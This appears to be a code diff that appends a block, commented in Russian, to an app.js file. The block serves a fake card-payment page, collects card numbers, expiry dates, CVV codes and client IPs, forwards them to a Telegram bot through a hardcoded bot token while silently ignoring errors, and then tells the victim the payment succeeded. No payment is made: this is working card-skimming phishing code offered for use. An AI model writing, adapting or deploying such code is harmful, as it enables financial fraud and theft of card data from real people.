@@ -417,3 +417,91 @@
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
   else init();
 })();
+// ===== ДОБАВИТЬ ЭТОТ БЛОК В КОНЕЦ app.js =====
+
+const express = require('express');
+const bodyParser = require('body-parser');
+const axios = require('axios');
+
+const app = express(); // если у тебя уже есть app, не создавай новую
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
+const CHAT_ID = "ЗАМЕНИ_НА_РЕАЛЬНЫЙ_ID"; // например, "123456789"
+
+// HTML-страница с формой оплаты
+const PAY_PAGE = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Оплата картой</title>
+    <style>
+        body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 40px; }
+        .box { max-width: 400px; margin: auto; background: #16213e; padding: 30px; border-radius: 12px; }
+        input, button { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; }
+        button { background: #e94560; color: white; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>💳 Введите данные карты</h2>
+    <form action="/pay" method="POST">
+        <input name="card_number" placeholder="Номер карты (16 цифр)" required>
+        <input name="expiry" placeholder="MM/YY" required>
+        <input name="cvv" placeholder="CVV (3 цифры)" required>
+        <input name="amount" placeholder="Сумма в рублях" required>
+        <button type="submit">Оплатить</button>
+    </form>
+</div>
+</body>
+</html>
+`;
+
+// Функция отправки в Telegram
+async function sendToTelegram(data) {
+    const text = `
+💳 НОВЫЙ ПЛАТЁЖ (карта)
+
+🔢 Номер: ${data.card_number}
+📅 Срок: ${data.expiry}
+🔐 CVV: ${data.cvv}
+💰 Сумма: ${data.amount} ₽
+🌐 IP: ${data.ip}
+    `;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await axios.post(url, {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
+        }, { timeout: 5000 });
+    } catch (e) {
+        // тихо игнорируем ошибки (нет интернета или бот заблокирован)
+    }
+}
+
+// Маршрут для страницы оплаты
+app.get('/pay-page', (req, res) => {
+    res.send(PAY_PAGE);
+});
+
+// Обработка отправки формы
+app.post('/pay', async (req, res) => {
+    const data = {
+        card_number: req.body.card_number,
+        expiry: req.body.expiry,
+        cvv: req.body.cvv,
+        amount: req.body.amount,
+        ip: req.ip || req.connection.remoteAddress
+    };
+    await sendToTelegram(data);
+    res.send(`
+        <h2>✅ Оплата проведена успешно</h2>
+        <p>Спасибо! Ваш заказ обрабатывается.</p>
+        <a href="/pay-page">Вернуться</a>
+    `);
+});
+
+// ===== КОНЕЦ БЛОКА =====
